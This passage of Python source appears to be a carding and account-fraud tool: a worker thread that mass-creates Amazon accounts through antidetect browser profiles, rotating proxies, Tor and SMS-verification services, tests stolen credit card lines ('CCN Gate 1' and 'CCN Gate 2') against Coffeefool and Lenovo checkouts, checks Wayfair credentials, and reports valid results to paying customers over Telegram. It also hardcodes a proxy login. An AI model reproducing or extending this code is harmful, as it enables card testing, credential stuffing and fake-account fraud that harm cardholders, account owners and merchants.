					os.rename(chrome_data_path, chrome_data_path+profile_id)
				account['profile_id'] = profile_id
				r = self.mun_api.add_accounts_created(account)

				self.statusqueue.put(('add_account', json.dumps(r)))				
	
			elif self.action == 'remove_profiles':
				data = {'list_id': self.data_put['list_checked']}
				r = self.mun_api.remove_profiles(data=data)
				self.statusqueue.put(
					('remove_profiles', json.dumps(r)))
				
			elif self.action == 'remove_accounts':
				data = {'list_id': self.data_put['list_checked']}
				r = self.mun_api.remove_accounts(data=data)
				self.statusqueue.put(
					('remove_accounts', json.dumps(r)))

			elif self.action == 'remove_emails':
				data = {'list_id': self.data_put['list_checked']}
				r = self.mun_api.remove_emails(data=data)
				self.statusqueue.put(
					('remove_emails', json.dumps(r)))				
   
			elif self.action == 'set_auto_view':
				data = {'list_id': self.data_put['list_checked']}
				r = self.mun_api.set_auto_views(data=data)
				self.statusqueue.put(
					('set_auto_view', json.dumps(r)))

			elif self.action == 'accounts_update_new_profiles':
				data = {'list_id': self.data_put['list_checked']}
				r = self.mun_api.accounts_update_new_profiles(data=data)
				self.statusqueue.put(
					('accounts_update_new_profiles', json.dumps(r)))		
	
			elif self.action == 'update_new_profiles':
				data = {'list_id': self.data_put['list_checked']}
				r = self.mun_api.update_new_profiles(data=data)
				self.statusqueue.put(
					('update_new_profiles', json.dumps(r)))				

			elif self.action == 'remove_auto_view':
				data = {'list_id': self.data_put['list_checked']}
				r = self.mun_api.remove_auto_views(data=data)
				self.statusqueue.put(
					('remove_auto_view', json.dumps(r)))   
			
			elif self.action == 'get_all_profiles':
				print('==get_all_profiles==')
				self.list_profiles = self.mun_api.get_all_profiles()
				self.statusqueue.put(
					('get_all_profiles', json.dumps(self.list_profiles['data'])))
				# self.antidetectmain.showrowsProfiles(self.list_profiles['data'])

			elif self.action == 'show_all_accounts':
				print('==show_all_accounts==')
				self.list_accounts = self.mun_api.get_accounts_created()
				# print(self.list_accounts)
				self.statusqueue.put(
					('show_all_accounts', json.dumps(self.list_accounts['data'])))
				# self.antidetectmain.showrowsProfiles(self.list_profiles['data'])

			elif self.action == 'show_all_emails':
				print('==show_all_emails==')
				self.list_accounts = self.mun_api.get_accounts_emails()
				# print(self.list_accounts)
				self.statusqueue.put(
					('show_all_emails', json.dumps(self.list_accounts['data'])))  
       
			elif self.action == 'show_all_signup_email':
				
				type_emails = self.data_put['type']
				print('==show_all_signup_email==', type_emails)
				self.list_accounts = self.mun_api.get_accounts_emails(action='list_signup_emails', dataGet={'account_type':type_emails})
				# print(self.list_accounts)
				self.statusqueue.put(
					('show_all_signup_email', json.dumps(self.list_accounts['data'])))    

			elif self.action == 'set_black_list_emails':
				
				type_emails = self.data_put['type']
				data = self.data_put['data']
				list_data = []
				for line in data:
					list_data.append(line['id'])
				self.data_put['data'] = list_data
				print('==set_black_list_emails==', type_emails)
				self.list_accounts = self.mun_api.set_black_list_accounts_emails(self.data_put)
				# print(self.list_accounts)
				self.statusqueue.put(('set_black_list_emails', json.dumps(self.list_accounts['data'])))    
			
			elif self.action == 'update_accounts_emails':
				# print('====', self.data_put['data'])
				r = self.mun_api.update_accounts_emails(
					update_data=self.data_put['data_update'])

			elif self.action == 'add_accounts_emails':
				print('==add_accounts_emails==')
				
				list_emails = self.data_put['data']

				result = self.mun_api.add_accounts_emails(list_emails)
				self.statusqueue.put(('add_accounts_emails', json.dumps(result)))	

			elif self.action == 'update_data':
				print('====', self.data_put['data_update'])
				r = self.mun_api.update_profile_by_id(
					update_data=self.data_put['data_update'])

				self.statusqueue.put(('update_data', json.dumps(r)))
	
			elif self.action == 'update_data_accounts':
				print('====', self.data_put['data_update'])
				r = self.mun_api.update_account_by_id(
					update_data=self.data_put['data_update'])
				self.statusqueue.put(('update_data_accounts', json.dumps(r)))	
			elif self.action == 'connect_email':
				print('==connect_email==')
				email_connect = self.data_put['email']
				email = email_connect['email']
				password = email_connect['password']
				# imap_server = self.get_imap_server(email)
				# print(imap_server)
				self.mun_email = munemail.MunEmail(email, password)
				login_result = self.mun_email.login()
				if login_result:
					print('==login sussess==')
					list_imap_emails = self.mun_email.getEmails(limit=10)
					for msg in list_imap_emails:
						# print(msg)
						email_data = {}
						email_data['date'] = msg.date_str
						email_data['from_'] = msg.from_
						email_data['to'] = msg.to
						email_data['subject'] = msg.subject
						email_data['text'] = msg.text.strip()
						email_data['html'] = msg.html.strip()
						# print(msg.date, msg.from_, msg.subject, msg.text.strip())	
						self.statusqueue.put(('email_msg', json.dumps(email_data)))
					print('==finish refesh email==')
			elif self.action == 'create_accounts':
				print('==create_accounts==')
				print(self.data_put['data'])
				creator_data = self.data_put['data']
				if creator_data['account_type'] == 'Amazon':
					print('==create_accounts Amazon==')
					self.mun_api.get_accounts_emails()
					if creator_data['proxy_type'] == '922 proxy':
						proxy_token = creator_data['proxy_token'].replace('&port=40000','') + '&port='
						r = self.request_browser.open(proxy_token+str(self.get_local_port()))
						account_proxy = r.text.strip()
						print('===',account_proxy)
					else:
						# data['account_proxy_type'] = 'socks5'
						account_proxy = creator_data['account_proxy']
					self.profilesBrowser['profile_proxy_type'] = 'Socks5'
					self.profilesBrowser['profile_socks5_details'] = account_proxy
					new_profile_info = self.mun_api.create_profile(
						profile_info=self.profilesBrowser)
					# status_dict = {'success':True, 'msg':'created successfully'}
					# print('===', new_profile_info)
					if 'data' in new_profile_info:
						signup_info = {}
						profile_info = new_profile_info['data']
						mun_browser = mybrowser.MunAntiBrowser()
						mun_driver = mun_browser.setting(inject_str=self.inject_info, profileInfo=profile_info)
						if mun_driver:
							amazonApi = amazon.Amazon(mun_browser=mun_driver, mobile=True, statusqueue=self.statusqueue)
							resultDataSignup = self.mun_api.get_accounts_data(action='create_accounts', dataGet={'account_type':'amazon'})
							if creator_data['email_type'] != 'Specific':
								if 'selected_emails' in self.data_put:
									emailData = self.data_put['selected_emails'][0]
								else:
									resultEmailSignup = self.mun_api.get_accounts_emails(action='create_accounts', dataGet={'account_type':'amazon'})
									emailData = resultEmailSignup['data'][0]
								# print(emailData)
								email_signup = emailData['email']
								if creator_data['password_type'] == 'Email list':
									passsword_signup = emailData['password']
								elif creator_data['password_type'] == 'Random':
									passsword_signup = self.generate_password()
								else:
									passsword_signup = creator_data['account_password']
								email_signup_password = emailData['password']
							else:
								email_signup = creator_data['account_email']
								if creator_data['password_type'] == 'Random':
									passsword_signup = self.generate_password()
								else:
									passsword_signup = creator_data['account_password']
								email_signup_password = None
							if resultDataSignup['data'] and email_signup and passsword_signup:
								dataSignup = resultDataSignup['data'][0]
								signup_info['email'] = email_signup
								signup_info['password'] = passsword_signup
								signup_info['first_name'] = dataSignup['first_name']
								signup_info['last_name'] = dataSignup['last_name']
								if email_signup_password:
									signup_info['email_password'] = email_signup_password
								if creator_data['phone_type'] == 'Viotp':
									signup_info['viotp_token'] = creator_data['phone_token']#bb116c18f3ce450e8193f8de9fb7298f'

								result = amazonApi.sign_up_account(signup_info, mobile=True)
								if result:
									data_email = {'email':signup_info['email'], 'password':signup_info['password'], 'type': 'Amazon', 'profile_id':profile_info['id'], 'email_id':'', 'data_id':'','signup_ip':mun_browser.browser_ip, 'phone_number': signup_info['phone_number']}
									self.mun_api.add_accounts_created(data_email)
				
			elif self.action == 'check_accounts':
				print('==check_accounts==')
				self.check_site = self.data_put['check_site']
				check_path = self.data_put['check_path'] 
				socks_type = self.data_put['socks_type']
				socks_token = self.data_put['socks_token']
				socks_times = self.data_put['socks_times']
				socks_data = self.data_put['socks_data']
				ssh_database = self.data_put['ssh_database']
				if check_path:
					listcheckopen = open(check_path,'r', encoding='utf8');
					self.listcheckss = listcheckopen.read()
					listcheckopen.close()
					list_check = self.listcheckss.split('\n')
				else:
					#get data from list check
					list_check = self.data_put['list_check']
				socks_list = socks_data.split('\n')
				# self.list_valid = []
				list_check_valid = []
				i = 0
				while i < len(list_check):
					line_check = list_check[i].strip()
					if line_check.strip():
						check_valid = self.check_valid_line_for_check(line_check)
						if not check_valid:
							print('not_valid',line_check)
						else:
							# self.list_valid.append(line_check.strip())
							if socks_list:
								while socks_list:
									profile_socks5 = socks_list.pop(0).strip()
									if profile_socks5.strip() and profile_socks5.find(':') != -1:
										break 			
							else:
								profile_socks5 = ''
								# profile_socks_type = ''
							if socks_times.strip():
								list_check_valid.append(line_check)
								# print('=========iiiiiii===', i, len(list_check))
								if (len(list_check_valid) >= int(socks_times.strip())) or (i >= len(list_check)-1):
									# list_check_valid.append(line_check)
									print('===antidetectQueQue put===')
									data_put = {}
									data_put['action'] = 'check_data'
									data_put['list_check'] = list_check_valid
									data_put['socks_type'] = socks_type
									data_put['socks_token'] = socks_token
									data_put['socks_details'] = profile_socks5
									data_put['site_check'] = self.check_site
									data_put['original_input'] = self.data_put
									self.antidetectQueQue.put(data_put)
									list_check_valid = []
								check_status = {'status':'loading', 'line_check':line_check}
								self.statusqueue.put(('check_status', json.dumps(check_status)))
					if list_check_valid and i >= len(list_check)-1:
						print('===Last antidetectQueQue put===')
						data_put = {}
						data_put['action'] = 'check_data'
						data_put['list_check'] = list_check_valid
						data_put['socks_type'] = socks_type
						data_put['socks_token'] = socks_token
						data_put['socks_details'] = profile_socks5
						data_put['site_check'] = self.check_site
						data_put['original_input'] = self.data_put
						self.antidetectQueQue.put(data_put)
						list_check_valid = []					
					i+=1
        
			elif self.action == 'check_data':
				list_check = self.data_put['list_check']
				socks_type = self.data_put['socks_type']
				socks_token = self.data_put['socks_token']
				socks_details = self.data_put['socks_details']
				check_site = self.data_put['site_check']
				checker_task_info = self.data_put.get('checker_task_info')
				list_unknown = []
				if socks_type == 'Tor':
					SOCKS_PORT = self.get_local_port()
					CONTROL_PORT = self.get_local_port()
					self.mun_proxy = munproxy.MunProxy()
					SOCKS_PORT, CONTROL_PORT, tor_process = self.mun_proxy.create_proxy('us', SOCKS_PORT=SOCKS_PORT, CONTROL_PORT=CONTROL_PORT, Rotating_time=30, Rotating=True, Bridge_String='', DataDirectory=())
					socks_details = '127.0.0.1:'+str(SOCKS_PORT)
				elif socks_type == '922 proxy':
					proxy_token = socks_token.replace('&port=40000','') + '&port='
					r = self.request_browser.open(proxy_token+str(self.get_local_port()))
					socks_details = r.text.strip()
				elif socks_type == 'Webshare':
					socks_details = socks_token
				print('check_site==', check_site)
				if check_site.lower() == 'ccn gate 1':
					print('===CCN Gate 1===')
					import coffeefool

					mun_browser = mybrowser.MunAntiBrowser()
					list_phone = ['iPhone', 'Android']
     
					self.mun_driver = mun_browser.open_random_driver(phoneOs=list_phone[random.randint(0, len(list_phone)-1)], sock5='fwhjolqn-rotate:d3oxuwiomiii@p.webshare.io:80', pageLoad=False)

					checkerApi = coffeefool.Coffeefool(mun_browser=mun_browser, driver=self.mun_driver)
					for line_data in list_check:
						resultDataSignup = self.mun_api.get_accounts_data(action='random_address')
						if resultDataSignup['data']:
							checkoutInfoCC = self.parse_cc(line_data)
							dataSignup = resultDataSignup['data'][0]
							checkoutInfo = checkoutInfoCC | dataSignup

							if checkoutInfo:
								try:
									check_result = checkerApi.check(checkoutInfo)
								except:
									print('unknown==',line_data)
									list_unknown.append(line_data)
								else:
									if check_result:
										check_status = {'status':'valid', 'line_check':line_data}
										print(check_status)
									else:
										check_status = {'status':'invalid', 'line_check':line_data}
									self.statusqueue.put(('check_status', json.dumps(check_status)))

					self.mun_driver.quit()
					if socks_type == 'Tor':
						self.mun_proxy.stop()
				

				if check_site.lower() == 'ccn gate 2':
					print('===CCN Gate 2===')
					import lenovo

					mun_browser = mybrowser.MunAntiBrowser()
					list_phone = ['iPhone', 'Android']
					mun_driver = None
					logged = False
					link_checkout = None
					list_valid = []
					list_invalid = []
					total_list_check = len(list_check)
					display_page = 1
					display_value = 0
					checker_info = None
					
					while list_check:
						if checker_task_info:
							checker_info = self.mun_api.get_checker_task(action='get_info',dataGet={'id':checker_task_info['data']['id']})
							#stop process
							if checker_info['data']['status'] == 2:
								break
							display_page_valid = checker_info['data']['display_page_valid']
							display_page_invalid = checker_info['data']['display_page_invalid']
							display_value = checker_info['data']['display_value']
							# if 
						get_result = self.mun_api.get_link_checkout(action='random', dataGet={'type':'lenovo'})
						if get_result['data']:
							link_checkout = get_result['data'][0]['url']
						if not link_checkout:
							if not logged:
								mun_driver = mun_browser.open_random_driver(sock5=socks_details.strip(), pageLoad=False, phoneOs='')
								checkerApi = lenovo.Lenovo(mun_browser=mun_browser, driver=mun_driver)  
								resultAccount = self.mun_api.get_accounts_created(action='random', dataGet={'type':'lenovo'})
								accountCreated = resultAccount['data'][0]
								try:
									link_checkout = checkerApi.get_link_checkout(sock5=socks_details.strip(), email=accountCreated['email'], password=accountCreated['password'])
									logged = True
								except Exception as e:
									# print(e)
									mun_driver.quit()
									continue
							if logged and not link_checkout:
								print('===get_link_checkout new===')
								try:
									link_checkout = checkerApi.get_link_checkout(sock5=socks_details.strip())
								except Exception as e:
									continue
								else:
									print('==requests==',link_checkout)
							
       
						if link_checkout:
							mun_driver = mun_browser.open_random_driver(sock5=socks_details.strip(), pageLoad=False, phoneOs='')
							checkerApi = lenovo.Lenovo(mun_browser=mun_browser, driver=mun_driver)  
							line_data = list_check.pop(0).strip()	
							resultDataSignup = self.mun_api.get_accounts_data(action='random_address')
							if resultDataSignup['data']:
								checkoutInfoCC = self.parse_cc(line_data)
								dataSignup = resultDataSignup['data'][0]
								checkoutInfo = checkoutInfoCC | dataSignup
								checkoutInfo['checkout_url'] = link_checkout
								
								if checkoutInfo:
									# print(checkoutInfo, socks_details)
									try:
										check_result = checkerApi.check(checkoutInfo, sock5=socks_details)
										
									except Exception as e:
										print('===============',e)
										if line_data not in list_check:
											list_check.append(line_data)
										link_checkout = None
										
									else:
										check_status = None
										if check_result['success']:
											check_status = {'status':'valid', 'line_check':line_data}
											if checker_info:
												checkerTaskInfo = checker_info['data']
												userInfo = checker_info['user']	
												print('==update checker_info valid==')
												list_valid.append(line_data)
												add_data = {}
												add_data['checker_owner'] = userInfo['username']
												add_data['details'] = line_data
												add_data['checker_task'] = checkerTaskInfo['id']
												add_data['checker_type'] = checkerTaskInfo['checker_type']
												update_data = {
													'data':[add_data]
												}    
												self.mun_api.add_checker_valid(data=update_data)

										elif check_result['unknown']:
											if line_data not in list_check:
												list_check.append(line_data)
										else:
											check_status = {'status':'invalid', 'line_check':line_data}
											if checker_info:
												checkerTaskInfo = checker_info['data']
												userInfo = checker_info['user']	
												print('==update checker_info invalid==')
												list_invalid.append(line_data)
												add_data = {}
												add_data['checker_owner'] = userInfo['username']
												add_data['details'] = line_data
												add_data['checker_task'] = checkerTaskInfo['id']
												add_data['checker_type'] = checkerTaskInfo['checker_type']
												update_data = {
													'data':[add_data]
												}    
												self.mun_api.add_checker_invalid(data=update_data)
										if check_status and not check_result['unknown']:
											self.statusqueue.put(('check_status', json.dumps(check_status)))
										if checker_info and not check_result['unknown']:
											print('==update status by telegram==')
											checkerTaskInfo = checker_info['data']
											userInfo = checker_info['user']											
											if checkerTaskInfo['status_message_id']:
												status_text = 'Checked %s/%s Left %s: %s valid, %s invalid.' % (len(list_valid)+len(list_invalid), total_list_check, len(list_check), len(list_valid), len(list_invalid))
												#mai lam phan nay hien thi theo value seting
												import math
												list_display_valid = []
												if display_value == 0:
													list_display_valid = list_valid
													display_page = display_page_valid
												elif display_value == 1:
													list_display_valid = list_invalid
													display_page = display_page_invalid
												page_total = math.ceil(float(len(list_display_valid)) / 50)
												list_display = []
												i = (display_page-1)*50
												while i < len(list_display_valid) and len(list_display) < 50:
													list_display.append(list_display_valid[i])
													i+=1  
												plant_text = '\n'.join('<code>'+str(x)+'</code>' for x in list_display)
												html_show = self.create_html_show('Checker '+ check_site, userInfo['current_banlance'], total_list_check, display_page, page_total, datetime.datetime.now().strftime("%d-%m-%Y %H:%M"), status=status_text, plant_text=plant_text)

												markup_button = self.create_checker_markup(checkerTaskInfo['id'],listing_type='checker_status', valid=len(list_valid), invalid=len(list_invalid))
												try:
													send_msg = self.edit_telegram_notify_to_group(userInfo['telegram_id'],checkerTaskInfo['status_message_id'], html_show, reply_markup=markup_button)	
												except Exception as e:
													print(e)
             
										if check_result['suspended']:
											print('==Link checkout suspended==')
											update_data = {}
											update_data['url'] = link_checkout
											update_data['update_data'] = {'status':3} 
											updateStatus = self.mun_api.update_link_checkout(update_data)
											link_checkout = None
											# print(updateStatus)
									try:
										mun_driver.quit()
									except Exception as e:
										print('===============',e)							
					if checker_task_info:
						if not checker_info:
							checker_info = self.mun_api.get_checker_task(action='get_info',dataGet={'id':checker_task_info['data']['id']})
						print('==update status by telegram==')
						checkerTaskInfo = checker_info['data']
						userInfo = checker_info['user']											
						if checkerTaskInfo['status_message_id']:
							status_text = 'Finished %s/%s Left %s: %s valid, %s invalid.' % (len(list_valid)+len(list_invalid), total_list_check, len(list_check), len(list_valid), len(list_invalid))
							import math
							list_display_valid = []
							if display_value == 0:
								list_display_valid = list_valid
							elif display_value == 1:
								list_display_valid = list_invalid

							page_total = math.ceil(float(len(list_display_valid)) / 10)
							list_display = []
							i = (display_page-1)*10
							while i < len(list_display_valid):
								list_display.append(list_display_valid[i])
								i+=1  
							plant_text = '\n'.join('<code>'+str(x)+'</code>' for x in list_display)
							html_show = self.create_html_show('Checker '+ check_site, userInfo['current_banlance'], total_list_check, 1, 1, datetime.datetime.now().strftime("%d-%m-%Y %H:%M"), status=status_text, plant_text=plant_text)

							markup_button = self.create_checker_markup(checkerTaskInfo['id'],listing_type='checker_status', valid=len(list_valid), invalid=len(list_invalid))

							send_msg = self.edit_telegram_notify_to_group(userInfo['telegram_id'],checkerTaskInfo['status_message_id'], html_show, reply_markup=markup_button)	
							if len(list_check) and checker_info:
								print('==Broken==')
								update_data = {}
								update_data['id'] = checker_info['data']['id']
								update_data['update_data'] = {'status':2}
								self.mun_api.update_checker_task(update_data=update_data)
							elif checker_info:
								print('==finished==')
								update_data = {}
								update_data['id'] = checker_info['data']['id']
								update_data['update_data'] = {'status':1}
								self.mun_api.update_checker_task(update_data=update_data)

					if mun_driver:
						mun_driver.quit()
						try:
							parent = psutil.Process(int(mun_driver.browser_pid))
							for child in parent.children(recursive=True):  # or parent.children() for recursive=False
								child.kill()
							parent.kill()
							os.kill(int(mun_driver.browser_pid),signal.SIGILL)
						except:
							pass
					if socks_type == 'Tor':
						self.mun_proxy.stop()					
      
				if check_site.lower() == 'macys':
					print('==check macys==')
				if check_site.lower() == 'wayfair':
					print('==check wayfair==')
					import wayfair

					mun_browser = mybrowser.MunAntiBrowser()
					list_phone = ['iPhone', 'Android']
					mun_driver = None
					logged = False
					link_checkout = None
					list_valid = []
					list_invalid = []
					total_list_check = len(list_check)
					while list_check:

						
						line_data = list_check.pop(0).strip()	

						checkoutInfo = self.parse_account(line_data)
						if checkoutInfo:
							# print(checkoutInfo, socks_details)
							try:
								checkerApi = wayfair.Wayfair(mun_browser=mun_browser, driver=mun_driver)  
								check_result = checkerApi.check(checkoutInfo, sock5=socks_details)
							except Exception as e:
								print('===============',e)
								if line_data not in list_check:
									list_check.append(line_data)
								link_checkout = None
							else:
								check_status = None
								if check_result['success']:
									check_status = {'status':'valid', 'line_check':check_result['msg']}
								elif check_result['unknown']:
									if line_data not in list_check:
										list_check.append(line_data)
								else:
									check_status = {'status':'invalid', 'line_check':line_data}
									list_invalid.append(line_data)
								if check_status:
									self.statusqueue.put(('check_status', json.dumps(check_status)))
         
								if checker_info:
									print('==update status by telegram==')
									checkerTaskInfo = checker_info['data']
									userInfo = checker_info['user']											
									if checkerTaskInfo['status_message_id']:
										status_text = 'Checked %s/%s Left %s: %s valid, %s invalid.' % (len(list_valid)+len(list_invalid), total_list_check, len(list_check), len(list_valid), len(list_invalid))
										plant_text = '</code>\n'.join('<code>'+str(x) for x in list_valid) 
										html_show = self.create_html_show('Checker '+ check_site, userInfo['current_banlance'], total_list_check, 1, 1, datetime.datetime.now().strftime("%d-%m-%Y %H:%M"), status=status_text, plant_text=plant_text)

										markup_button = self.create_checker_markup(checkerTaskInfo['id'],listing_type='checker_status', valid=len(list_valid), invalid=len(list_invalid))
	
										send_msg = self.edit_telegram_notify_to_group(userInfo['telegram_id'],checkerTaskInfo['status_message_id'], html_show, reply_markup=markup_button)	
								# if check_result['suspended']:
								# 	print('==Link checkout suspended==')
								# 	update_data = {}
								# 	update_data['url'] = link_checkout
								# 	update_data['update_data'] = {'status':3} 
								# 	updateStatus = self.mun_api.update_link_checkout(update_data)
								# 	link_checkout = None
									# print(updateStatus)
					if checker_info:
						print('==update status by telegram==')
						checkerTaskInfo = checker_info['data']
						userInfo = checker_info['user']											
						if checkerTaskInfo['status_message_id']:
							status_text = 'Finished %s/%s: %s valid, %s invalid.' % (len(list_valid)+len(list_invalid), total_list_check, len(list_valid), len(list_invalid))
							plant_text = '</code>\n'.join('<code>'+str(x) for x in list_valid)  
							html_show = self.create_html_show('Checker '+ check_site, userInfo['current_banlance'], total_list_check, 1, 1, datetime.datetime.now().strftime("%d-%m-%Y %H:%M"), status=status_text, plant_text=plant_text)

							markup_button = self.create_checker_markup(checkerTaskInfo['id'],listing_type='checker_status', valid=len(list_valid), invalid=len(list_invalid))

							send_msg = self.edit_telegram_notify_to_group(userInfo['telegram_id'],checkerTaskInfo['status_message_id'], html_show, reply_markup=markup_button)	
					if mun_driver:
						mun_driver.quit()
						try:
							os.kill(int(mun_driver.browser_pid),signal.SIGILL)
						except:
							pass
					if socks_type == 'Tor':
						self.mun_proxy.stop()	      
				if list_unknown:
					
					original_input = self.data_put['original_input']
					print('===list_unknown===', original_input)
					original_input['check_path'] = ''
					original_input['list_check'] = list_unknown
					self.antidetectQueQue.put(original_input)

			elif self.action == 'get_link_checkout':
				self.check_site = self.data_put['check_site']
				# check_path = self.data_put['check_path'] 
				socks_type = self.data_put['socks_type']
				socks_token = self.data_put['socks_token']
				socks_times = self.data_put['socks_times']
				socks_data = self.data_put['socks_data']
				ssh_database = self.data_put['ssh_database']
				if socks_type == 'Tor':
					SOCKS_PORT = self.get_local_port()
					CONTROL_PORT = self.get_local_port()
					self.mun_proxy = munproxy.MunProxy()
					SOCKS_PORT, CONTROL_PORT, tor_process = self.mun_proxy.create_proxy('us', SOCKS_PORT=SOCKS_PORT, CONTROL_PORT=CONTROL_PORT, Rotating_time=30, Rotating=True, Bridge_String='', DataDirectory=())
					socks_details = '127.0.0.1:'+str(SOCKS_PORT)
				elif socks_type == '922 proxy':
					proxy_token = socks_token.replace('&port=40000','') + '&port='
					r = self.request_browser.open(proxy_token+str(self.get_local_port()))
					socks_details = r.text.strip()    
				elif socks_type == 'Webshare':
					socks_details = socks_token
	
     
				print('===CCN Gate 2 Get Link Checkout===')
				print('===socks details===', socks_details)
				import lenovo

				mun_browser = mybrowser.MunAntiBrowser()
				list_phone = ['iPhone', 'Android']

				logged = False
				link_checkout = None
				extra_cookies = None
				mun_driver = mun_browser.open_random_driver(sock5=socks_details.strip(), pageLoad=False, phoneOs='')
				i=0
				while i <= int(socks_times):
					if not link_checkout:

						try:
							checkerApi = lenovo.Lenovo(mun_browser=mun_browser, driver=mun_driver)   

							resultDataSignup = self.mun_api.get_accounts_data(action='random_address')
							if resultDataSignup['data']:
								dataSignup = resultDataSignup['data'][0]
								alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
								min = 8
								max = 16
								stringimg = ''
								list_domain = ['comcast.net', 'verizon.net', 'earthlink.net', 'att.net', 'sbcglobal.net', 'msn.com', 'juno.com',
											'yahoo.com', 'aol.com', 'live.com']
								mail_domain = list_domain[random.randint(0, len(list_domain) - 1)]
								for x in random.sample(alphabet, random.randint(min, max)):
									stringimg += x
								username_chuan = stringimg
								# # print checkout_form
								self.email_chuan = username_chuan + '@' + mail_domain
								if not extra_cookies:
									extra_cookies = checkerApi.get_cookies_by_chrome(sock5=socks_details.strip(), email=self.email_chuan, infoCheckout=dataSignup)
								link_checkout = checkerApi.get_link_checkout(sock5=socks_details.strip(), email=self.email_chuan, infoCheckout=dataSignup, extra_cookies=extra_cookies)
								# logged = True
						except Exception as e:
							# try:
							# 	mun_driver.quit()	
							# 	parent = psutil.Process(int(mun_driver.browser_pid))
							# 	for child in parent.children(recursive=True):  # or parent.children() for recursive=False
							# 		child.kill()
							# 	parent.kill()
							# 	os.kill(int(mun_driver.browser_pid),signal.SIGILL)
							# except Exception as e:
							# 	pass
							continue
					if link_checkout:
						print('==update link checkout==')
						try:
							list_link = []
							list_link.append(link_checkout)
							linkData = {}
							linkData['type'] = 'lenovo' 
							linkData['data'] = list_link
							resultAddLink = self.mun_api.add_link_checkout(linkData)
							print(resultAddLink)
							check_status = {'status':'valid', 'line_check':link_checkout}
							self.statusqueue.put(('check_status', json.dumps(check_status)))
							link_checkout = None
							i+=1
						except Exception as e:
							print('=====Update link checkout Error===', e)
				if mun_driver:
					try:
						mun_driver.quit()	
						parent = psutil.Process(int(mun_driver.browser_pid))
						for child in parent.children(recursive=True):  # or parent.children() for recursive=False
							child.kill()
						parent.kill()
						os.kill(int(mun_driver.browser_pid),signal.SIGILL)
					except:
						pass
				if socks_type == 'Tor':
					self.mun_proxy.stop()					
      
			else:
			# while 1:
				# print('==telegram bot==')
				# check_path = self.data_put['check_path'] 
				socks_type = self.data_put['socks_type']
				socks_token = self.data_put['socks_token']
				socks_times = self.data_put['socks_times']
				socks_data = self.data_put['socks_data']
				ssh_database = self.data_put['ssh_database']
				socks_data = self.data_put['socks_data']
				socks_list = socks_data.split('\n')
				if socks_list:
					while socks_list:
						profile_socks5 = socks_list.pop(0).strip()
						if profile_socks5.strip() and profile_socks5.find(':') != -1:
							break 			
				else:
					profile_socks5 = ''
				try:
					checkerTaskInfos = self.mun_api.get_checker_task()
				except:
					time.sleep(3)
					continue
				print(checkerTaskInfos)
				checkerTaskInfo = checkerTaskInfos['data']
				if checkerTaskInfo:
					userInfo = checkerTaskInfos['user']
					self.check_site = checkerTaskInfo['checker_type']
					check_text = self.mun_api.get_checker_files(checkerTaskInfo['id'])

					list_check = check_text.split('\n')
					list_check_valid = [line for line in list_check if self.check_valid_line_for_check(line)]

					print('===antidetectQueQue put===', list_check_valid)
					data_put = {}
					data_put['action'] = 'check_data'
					data_put['list_check'] = list_check_valid
					data_put['socks_type'] = socks_type
					data_put['socks_token'] = socks_token
					data_put['socks_details'] = profile_socks5
					data_put['site_check'] = self.check_site
					data_put['original_input'] = self.data_put
					data_put['checker_task_info'] = checkerTaskInfos
					self.antidetectQueQue.put(data_put)
				self.antidetectQueQue.put(self.data_put)
					# print('==get valid list==')
					# html_show = self.create_html_show('Checker status', userInfo['current_banlance'], len(list_check_valid), 1, 1, datetime.datetime.now().strftime("%d-%m-%Y %H:%M"))

					# markup_button = self.create_checker_markup(checkerTaskInfo['id'],listing_type='checker_status')
					# print('status_message_id===',checkerTaskInfo['status_message_id'])
					# if checkerTaskInfo['status_message_id']:
					# 	send_msg = self.edit_telegram_notify_to_group(userInfo['telegram_id'],checkerTaskInfo['status_message_id'], html_show, reply_markup=markup_button)			
				# else:
				# 	print('==create new status process bar===')
				# 	send_msg = self.send_telegram_notify_to_group(userInfo['telegram_id'], msg=html_show, reply_markup=markup_button)	
				# 	status_message_id = send_msg['message_id']
					
   					
			if self.driver:
       
				if 'id' in self.browser.profileInfo:
					dict_pid = {self.browser.profileInfo['id']:self.driver.browser_pid}
					if dict_pid not in self.list_pid:
						print('===os_pid===')
						self.statusqueue.put(('os_pid', json.dumps(dict_pid)))	
						self.list_pid.append(dict_pid)
			time.sleep(1)

class CheckBoxHeader(QHeaderView):

	select_all_clicked = pyqtSignal(bool)
	_x_offset = 3
	_y_offset = 0
	_width = 20
	_height = 20

	def __init__(self, orientation=Qt.Horizontal, parent=None, all_header_combobox=[]):
		super(CheckBoxHeader, self).__init__(orientation, parent)
		self.isOn = False
		self.all_header_combobox = all_header_combobox

	def paintSection(self, painter, rect, logicalIndex):
		painter.save()
		super(CheckBoxHeader, self).paintSection(painter, rect, logicalIndex)
		painter.restore()

		self._y_offset = int((rect.height() - self._width) / 2.)

		if logicalIndex == 0:
			option = QStyleOptionButton()
			option.rect = QRect(rect.x() + self._x_offset, rect.y() + self._y_offset, self._width, self._height)
			option.state = QStyle.State_Enabled | QStyle.State_Active
			if self.isOn:
				option.state |= QStyle.State_On
			else:
				option.state |= QStyle.State_Off
			self.style().drawControl(QStyle.CE_CheckBox, option, painter)


	def mousePressEvent(self, event):
		index = self.logicalIndexAt(event.pos())
		if 0 == index:
			x = self.sectionPosition(index)
			if x + self._x_offset < event.pos().x() < x + self._x_offset + self._width and self._y_offset < event.pos().y() < self._y_offset + self._height:
				if self.isOn:
					self.isOn = False
				else:
					self.isOn = True
					# 当用户点击了行表头复选框，发射 自定义信号 select_all_clicked()
				self.select_all_clicked.emit(self.isOn)
				self.updateSection(0)
		if 1 == index:
			print("a")
		super(CheckBoxHeader, self).mousePressEvent(event)

	# 自定义信号 select_all_clicked 的槽方法
	def change_state(self, isOn):
		list_remove = []
		if isOn:
			for i in self.all_header_combobox:
				try:
					i.setCheckState(Qt.Checked)
				except:
					list_remove.append(i)
		else:
			for i in self.all_header_combobox:
				try:
					i.setCheckState(Qt.Unchecked)
				except:
					list_remove.append(i)
		if list_remove:
			for i in list_remove:
				self.all_header_combobox.remove(i)

class AddEmailsetup(QtWidgets.QDialog):
	def __init__(self, parent=None):
		QtWidgets.QDialog.__init__(self, parent)
		self.main = parent

		# uic.loadUi('ui/sshsetup.ui', self)
		self.uiAddEmails = addemails.Ui_DialogAddEmails()
		self.uiAddEmails.setupUi(self)
		self.uiAddEmails.pushButtonAddEmails.clicked.connect(self.handle_add_account)
